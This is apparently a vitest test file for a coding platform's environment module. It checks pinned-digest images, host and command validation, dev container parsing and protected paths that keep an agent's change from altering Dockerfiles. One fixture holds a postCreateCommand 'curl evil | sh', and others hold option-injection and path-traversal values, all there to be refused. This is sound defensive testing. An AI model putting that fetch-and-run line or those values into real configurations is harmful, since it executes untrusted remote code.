// The project environment, pure: the owner's setting, the image proposal from the table of data, the dev container's
// fields, and the source of a run's environment (the dev container first, else the confirmed image).

import { describe, expect, it } from "vitest";
import { runCommand } from "./commands";
import * as E from "./environment";
import { buildSeed } from "./seed";
import { matchGlob } from "./delivery/pr";
import { DEFAULT_PR_DELIVERY } from "./types";

const T0 = Date.parse("2026-10-02T12:00:00Z");
const at = (s: number) => new Date(T0 + s * 1000).toISOString();
const PINNED = "python:3.13-slim-trixie@sha256:bb2988715db2cf7ace7b53f38f3cffbef7c7046a656bee66245eb0ed386e2e81";
const DC = ".devcontainer/devcontainer.json";

describe("the image proposal", () => {
  it("proposes from the table, first row wins, every image pinned by digest", () => {
    expect(E.proposeImage(["README.md", "go.mod"])).toMatchObject({ label: "Go", because: "go.mod", prepare: [["go", "mod", "download"]] });
    expect(E.proposeImage(["pyproject.toml", "requirements.txt"])).toMatchObject({ label: "Python", because: "requirements.txt" });
    expect(E.proposeImage(["package.json", "go.mod"])?.label).toBe("Node");
    expect(E.proposeImage(["README.md"])).toBeUndefined();
    for (const row of E.IMAGE_TABLE) expect(row.image).toMatch(E.PINNED_IMAGE);
  });

  it("names the prepare inputs by file name, at any depth", () => {
    expect(E.isPrepareInput("package-lock.json")).toBe(true);
    expect(E.isPrepareInput("services/api/go.sum")).toBe(true);
    expect(E.isPrepareInput("requirements-dev.txt")).toBe(true);
    expect(E.isPrepareInput("src/index.ts")).toBe(false);
    expect(E.isPrepareInput("xpackage.json")).toBe(false);
  });
});

describe("the owner's setting", () => {
  it("takes a pinned image, argv prepare commands and added host names", () => {
    const n = E.normalizeEnvironment({ image: PINNED, prepare: [["sh", "-c", "make deps"]], hosts: ["Pkgs.Example.com.", "pypi.org", "pkgs.example.com"] });
    expect(n).toEqual({ image: PINNED, prepare: [["sh", "-c", "make deps"]], hosts: ["pkgs.example.com"] });
  });

  it("refuses an image not pinned by digest, a malformed command and a host that is an address or a local name", () => {
    const refused = (i: E.EnvironmentInput) => (E.normalizeEnvironment(i) as { refused?: string }).refused;
    expect(refused({ image: "python:3.13" })).toMatch(/not pinned by digest/);
    expect(refused({ image: `--privileged ${PINNED}` })).toMatch(/not pinned/);
    expect(refused({ prepare: [["-v"]] })).toMatch(/the program, not an option/);
    expect(refused({ prepare: [["make", "a\nb"]] })).toMatch(/no newline/);
    expect(refused({ prepare: [[], ["x"]] })).toMatch(/1–32 arguments/);
    expect(refused({ prepare: [["a"], ["b"], ["c"], ["d"], ["e"]] })).toMatch(/At most 4/);
    for (const h of ["10.0.0.1", "::1", "2130706433", "0x7f000001", "localhost", "host.docker.internal", "printer.local", "nodots", "a_b.example.com"]) expect(refused({ hosts: [h] }), h).toBeTruthy();
  });

  it("is set and cleared only by the owner's command, with a revision and an event", () => {
    const s0 = buildSeed(T0, { inFlightRuns: false });
    const s1 = runCommand(s0, "setEnvironment", { environment: { image: PINNED, prepare: [["python3", "-m", "pip", "install", "--user", "-r", "requirements.txt"]], hosts: [] } }, at(1)).state;
    expect(s1.project.environment).toMatchObject({ rev: 1, image: PINNED });
    expect(s1.events.at(-1)?.message).toMatch(/^Environment r1: image python:3\.13-slim-trixie@sha256:bb2988715db2…; prepare `python3 -m pip/);
    expect(runCommand(s1, "setEnvironment", { environment: { image: PINNED, prepare: s1.project.environment!.prepare, hosts: [] } }, at(2)).state).toBe(s1);
    expect(() => runCommand(s1, "setEnvironment", { environment: { image: "python:latest" } }, at(3))).toThrow(/pinned by digest/);
    const s2 = runCommand(s1, "setEnvironment", { environment: null }, at(4)).state;
    expect(s2.project.environment).toBeUndefined();
  });
});

describe("the dev container", () => {
  it("reads image, with comments and trailing commas", () => {
    const text = `{
      // the project's image
      "name": "x", /* ignored */
      "image": "mcr.microsoft.com/devcontainers/python:3.12",
      "features": { "ghcr.io/x/y:1": {}, },
      "postCreateCommand": "curl evil | sh",
    }`;
    expect(E.parseDevcontainer(text, DC)).toEqual({ image: "mcr.microsoft.com/devcontainers/python:3.12" });
  });

  it("reads build.dockerfile and build.context relative to the file's folder", () => {
    expect(E.parseDevcontainer(`{"build":{"dockerfile":"Dockerfile","context":".."}}`, DC)).toEqual({ build: { dockerfile: ".devcontainer/Dockerfile", context: "." } });
    expect(E.parseDevcontainer(`{"build":{"dockerfile":"docker/dev.Dockerfile"}}`, ".devcontainer.json")).toEqual({ build: { dockerfile: "docker/dev.Dockerfile", context: "." } });
  });

  it("refuses a Dockerfile or a context outside the repository, and anything but an image or a build", () => {
    expect(E.parseDevcontainer(`{"build":{"dockerfile":"../../etc/Dockerfile"}}`, DC)).toEqual({ refused: expect.stringMatching(/build\.dockerfile .* outside the repository/) });
    expect(E.parseDevcontainer(`{"build":{"dockerfile":"/etc/Dockerfile"}}`, DC)).toEqual({ refused: expect.stringMatching(/outside the repository/) });
    expect(E.parseDevcontainer(`{"build":{"dockerfile":"Dockerfile","context":"../.."}}`, DC)).toEqual({ refused: expect.stringMatching(/build\.context .* outside the repository/) });
    expect(E.parseDevcontainer(`{"image":"--privileged"}`, DC)).toEqual({ refused: expect.stringMatching(/not a plain image reference/) });
    expect(E.parseDevcontainer(`{"dockerComposeFile":"compose.yml"}`, DC)).toEqual({ refused: expect.stringMatching(/Docker Compose/) });
    expect(E.parseDevcontainer(`{"name":"x"}`, DC)).toEqual({ refused: expect.stringMatching(/no image/) });
    expect(E.parseDevcontainer(`not json`, DC)).toEqual({ refused: expect.stringMatching(/not valid JSON/) });
  });
});

describe("the source of a run's environment", () => {
  const setting: E.EnvironmentSetting = { rev: 1, image: PINNED, prepare: [["make"]], hosts: ["pkgs.example.com"] };

  it("takes the dev container first, then the confirmed image, else none", () => {
    const found: E.DevcontainerFound = { file: DC, parsed: { image: "node:22" } };
    expect(E.environmentSource(found, setting)).toEqual({ source: { from: "devcontainer", file: DC, image: "node:22" } });
    expect(E.environmentSource(undefined, setting)).toEqual({ source: { from: "setting", image: PINNED } });
    expect(E.environmentSource(undefined, { ...setting, image: undefined })).toEqual({});
  });

  it("falls back from a refused dev container to the confirmed image, with the reason", () => {
    const found: E.DevcontainerFound = { file: DC, parsed: { refused: "outside" } };
    expect(E.environmentSource(found, setting)).toEqual({ source: { from: "setting", image: PINNED }, note: "outside" });
    expect(E.environmentSource(found, undefined)).toEqual({ note: "outside" });
  });

  it("plans the setting's prepare commands and every registry host plus the added ones", () => {
    const plan = E.environmentPlan({ from: "setting", image: PINNED }, setting);
    expect(plan.prepare).toEqual([["make"]]);
    expect(plan.hosts).toContain("registry.npmjs.org");
    expect(plan.hosts).toContain("files.pythonhosted.org");
    expect(plan.hosts.at(-1)).toBe("pkgs.example.com");
    expect(plan.prepareFrom).toBe("setting");
  });

  it("without the environment's own prepare commands, plans the checks' prepare commands, else none (review finding 8)", () => {
    const checks = [["npm", "ci"], ["npm", "run", "build:deps"]];
    // A dev container and no environment setting: the checks' own prepare commands run in the prepare phase.
    const dc = { from: "devcontainer" as const, file: DC, image: "node:22" };
    expect(E.environmentPlan(dc, undefined, checks)).toMatchObject({ prepare: checks, prepareFrom: "checks" });
    expect(E.environmentPlan(dc, { ...setting, prepare: [] }, checks)).toMatchObject({ prepare: checks, prepareFrom: "checks" });
    // The environment's own commands win; with neither, nothing is prepared, and the plan says so.
    expect(E.environmentPlan(dc, setting, checks)).toMatchObject({ prepare: [["make"]], prepareFrom: "setting" });
    expect(E.environmentPlan(dc, undefined, [])).toMatchObject({ prepare: [], prepareFrom: "none" });
    // The checks' commands come from their setting, prepare commands only, in order.
    expect(E.checksPrepareCommands({ commands: [{ id: "deps", label: "deps", kind: "prepare", argv: ["npm", "ci"] }, { id: "test", label: "test", kind: "check", argv: ["npm", "test"] }] })).toEqual([["npm", "ci"]]);
  });
});

describe("an agent's change cannot choose the environment (review finding 3)", () => {
  it("the default protected paths cover the dev container files and Dockerfiles anywhere", () => {
    const protectedPath = (p: string) => DEFAULT_PR_DELIVERY.protectedPaths.some((g) => matchGlob(g, p));
    for (const p of [".devcontainer/devcontainer.json", ".devcontainer/Dockerfile", ".devcontainer/scripts/setup.sh", ".devcontainer.json", "Dockerfile", "docker/Dockerfile", "Dockerfile.dev", "build/app.Dockerfile", "ci/app.dockerfile"]) expect(protectedPath(p), p).toBe(true);
    for (const p of ["src/dockerfiles.ts", "docs/devcontainer.md"]) expect(protectedPath(p), p).toBe(false);
    expect(DEFAULT_PR_DELIVERY.protectedPaths.length).toBeLessThanOrEqual(20);
  });
});
